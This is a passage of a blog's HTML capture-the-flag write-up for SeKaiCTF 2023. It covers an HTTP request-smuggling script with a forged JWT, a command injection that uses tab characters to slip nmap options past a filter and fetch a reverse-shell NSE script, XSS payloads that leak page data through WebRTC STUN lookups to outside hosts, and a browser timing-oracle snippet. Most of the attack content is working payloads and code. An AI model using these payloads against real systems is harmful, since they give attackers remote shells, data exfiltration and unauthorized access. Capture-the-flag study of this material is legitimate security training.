class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">http_request+=<span class="string">&quot;Content-Length: &#123;&#125;\n&quot;</span>.format(14+len(smuggle))</span><br><span class="line">	http_request+=<span class="string">&quot;transfer-encoding: chunked\n&quot;</span></span><br><span class="line">http_request+=<span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">http_request+=<span class="string">&quot;4\r\na=bs\r\n0\r\n\r\n&quot;</span>+smuggle</span><br><span class="line">http_request+=f<span class="string">&quot;&quot;</span><span class="string">&quot;GET /&#123;user_id&#125;/.well-known/jwks.json HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">http_request+=<span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(http_request)</span><br><span class="line"></span><br><span class="line">client_socket.send(http_request.encode())</span><br><span class="line"></span><br><span class="line">response = client_socket.recv(2048)</span><br><span class="line"><span class="built_in">print</span>(response.decode())</span><br><span class="line"></span><br><span class="line">client_socket.close()</span><br><span class="line"></span><br><span class="line">b =requests.get(url+f<span class="string">&quot;/&#123;user_id&#125;/.well-known/jwks.json&quot;</span>)</span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span> : <span class="string">&quot;Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.bLHThpy3ZL1uIJNarMluJgOwkn79CS-_6GHecDByxe_Fl-Z1-y5U4fcsGgRLRBU5PVWQCefpzjtm1Kdc4dgxWbsO0lpCHwdm5Qeaqhe6eLxiBpQH_Un0OSMY2SHhjmiXlNFSDyDgpXUSemGnTnQR47K_V9h50cM8_IIx1Lbzs4w&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(s.get(url+<span class="string">&quot;/admin/flag&quot;</span>, headers=headers).text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Scanner-Service"><a href="#Scanner-Service" class="headerlink" title="Scanner Service"></a><strong>Scanner Service</strong></h1><p>This challenge involves command injection and Nmap script exploitation. It features a Ruby web application that obtains <code>IP:PORT</code> from user input and then passes it to the Nmap command <code>nmap -p PORT(controllable point) IP</code>. </p>
+<p>Additionally, the application implements a filter for user input, escaping special characters, including: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">space, $ ` <span class="string">&quot; \ | &amp; ; &lt; &gt; ( ) &#x27; \n *</span></span><br></pre></td></tr></table></figure>
+
+<p>Typically, injecting new Bash commands is challenging due to the strict filter. However, we can use <code>%09</code> (tab character) to replace spaces and inject new parameters, so that leveraging nmap script making it possible to execute arbitrary commands. This requires two steps:</p>
+<p>1、Launch a http server at your remote server, just using the command <code>php -S 0.0.0.0:80</code> , and serve a reverse shell NSE script in the root directory of the PHP HTTP server you’ve just set up. For the reverse shell nse script, you can download from <a target="_blank" rel="noopener" href="https://github.com/SurajDadral/nmap-reverse-shell/blob/main/reverse_shell.nse">here</a>.</p>
+<p>2、Use the <a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/http-fetch.html">http-fetch script</a> to download malicious nse script from our remote server. In this example, the nse script will be saved in the directory of <code>/tmp/OUR_REMOTE_SERVER_IP/PORT/</code> at the vulnerable server. The tips from the project <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">gtfobins</a>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 --script http-fetch --script-args http-fetch.destination=/tmp/,http-fetch.url=reverse_shell.nse YOUR_REMOTE_SERVER_IP</span><br></pre></td></tr></table></figure>
+
+<p>The actual payload is:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">service=OUR_REMOTE_SERVER_IP%3A80%09--script%09http-fetch%09--script-args%09http-fetch.destination%3D/tmp/%2Chttp-fetch.url%3D/reverse_shell.nse</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-82301c0270ea6c64b96b2f2de0690be4.png" alt="Untitled"></p>
+<p>3、Execute the script just downloaded at the target server to get a shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On your remote server</span></span><br><span class="line">nc -nvlp 8080</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">nmap -p 80 --script=/tmp/OUR_REMOTE_SERVER_IP/80/reverse_shell.nse OUR_REMOTE_SERVER_IP</span><br><span class="line"></span><br><span class="line"><span class="comment"># actual payload</span></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">service=OUR_REMOTE_SERVER_IP%3A80%09--script%3D%2Ftmp/OUR_REMOTE_SERVER_IP%2F80%2Freverse_shell.nse</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-6b7bc474c7d9c1a6699772907b4da1df.png" alt="Untitled"></p>
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-eef5239ef6d2d0d00478dd582b853d60.png" alt="Untitled"></p>
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2:"></a>Solution 2:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--script http-enum --script-args-file /flag-????????????????????????????????.txt -vvvvvv -dddddd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://api.2h0ng.wiki/noteimages/2024/01/21/18-10-39-0b2ca9c338d8ad07eb150f9645f8be9e.png" alt="Untitled"></p>
+<h1 id="Golf-jail"><a href="#Golf-jail" class="headerlink" title="Golf-jail"></a>Golf-jail</h1><p><a target="_blank" rel="noopener" href="https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/">https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail&#x2F;</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Golf-jail: tiny xss + webrtc</span><br><span class="line"></span><br><span class="line">https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=<span class="built_in">eval</span>(%60%27%60%2bbaseURI)%3E<span class="comment">#&#x27;;eval(decodeURIComponent(&#x27;pc%20=%20new%20RTCPeerConnection(&#123;%22iceServers%22:[&#123;%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72, 8)+%22.%22+%22troll196.messwithdns.com%22]&#125;]&#125;);pc.createOffer(&#123;offerToReceiveAudio:1&#125;).then(o=%3Epc.setLocalDescription(o));&#x27;))</span></span><br><span class="line"></span><br><span class="line">https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=<span class="built_in">eval</span>(%60%27%60%2bbaseURI)%3E<span class="comment">#&#x27;;eval(decodeURIComponent(&#x27;pc%20=%20new%20RTCPeerConnection(&#123;%22iceServers%22:[&#123;%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72,%208)+%22.%22+%22bwbgc97xua0ki7t5srhm1w1mldr4fy3n.oastify.com%22]&#125;]&#125;);pc.createOffer(&#123;offerToReceiveAudio:1&#125;).then(o=%3Epc.setLocalDescription(o));&#x27;))</span></span><br><span class="line"></span><br><span class="line">https://golfjail.chals.sekai.team/?xss=%3Csvg/onload=<span class="built_in">eval</span>(%60%27%60%2bbaseURI)%3E<span class="comment">#&#x27;;eval(decodeURIComponent(&#x27;pc%20=%20new%20RTCPeerConnection(&#123;%22iceServers%22:[&#123;%22urls%22:[%22stun:%22+document.firstChild.data.split(%22%22).map(x=%3Ex.charCodeAt(0).toString(16)).join(%22%22).substr(72, 8)+%22.%22+%2272b67c6a53.ipv6.1433.eu.org.%22]&#125;]&#125;);pc.createOffer(&#123;offerToReceiveAudio:1&#125;).then(o=%3Epc.setLocalDescription(o));&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="leakless-note"><a href="#leakless-note" class="headerlink" title="leakless note"></a>leakless note</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ts a timing attack, but not on the network <span class="built_in">which</span> is crazy</span><br><span class="line">im pretty sure it has to <span class="keyword">do</span> with site isolation</span><br><span class="line"></span><br><span class="line">// leakless note oracle</span><br><span class="line">const oracle = async (w, href) =&gt; &#123;</span><br><span class="line">    const runs = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">let</span> i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">        const samples = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">let</span> j = 0; j &lt; 600; j++) &#123;</span><br><span class="line">            const b = new Uint8Array(1e6);</span><br><span class="line">            const t = performance.now();</span><br><span class="line">            w.frames[0].postMessage(b, <span class="string">&quot;*&quot;</span>, [b.buffer]);</span><br><span class="line">            samples.push(performance.now() - t);</span><br><span class="line">            delete b;</span><br><span class="line">        &#125;</span><br><span class="line">        runs.push(samples.reduce((a,b)=&gt;a+b, <span class="number">0</span>));</span><br><span class="line">        w.location = href;</span><br><span class="line">        await <span class="built_in">sleep</span>(500); // rate <span class="built_in">limit</span></span><br><span class="line">        await waitFor(w);</span><br><span class="line">    &#125;</span><br><span class="line">    runs.sort((a,b) =&gt; a-b);</span><br><span class="line">    return &#123;</span><br><span class="line">        median: median(runs.slice(<span class="number">2</span>, -<span class="number">2</span>)),</span><br><span class="line">        <span class="built_in">sum</span>: runs.slice(2, -2).reduce((a,b)=&gt;a+b,<span class="number">0</span>),</span><br><span class="line">        runs</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">oracle: use large uint8arrays as transferrables over postMessage, for some reason the timing is different on chrome error page than not</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Chunky"><span class="toc-number">1.</span> <span class="toc-text">Chunky</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-guess"><span class="toc-number">1.2.</span> <span class="toc-text">Exploitation guess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-1"><span class="toc-number">1.3.</span> <span class="toc-text">Writeup 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup-2"><span class="toc-number">1.4.</span> <span class="toc-text">Writeup 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scanner-Service"><span class="toc-number">2.</span> <span class="toc-text">Scanner Service</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-2"><span class="toc-number">2.1.</span> <span class="toc-text">Solution 2:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Golf-jail"><span class="toc-number">3.</span> <span class="toc-text">Golf-jail</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#leakless-note"><span class="toc-number">4.</span> <span class="toc-text">leakless note</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&text=SeKaiCTF 2023-Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&is_video=false&description=SeKaiCTF 2023-Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SeKaiCTF 2023-Writeup&body=Check out this article: https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&title=SeKaiCTF 2023-Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&name=SeKaiCTF 2023-Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.2h0ng.wiki/2023/08/27/SeKaiCTF-2023/&t=SeKaiCTF 2023-Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    2h0ng, Zhong
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/superboy-zjc">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
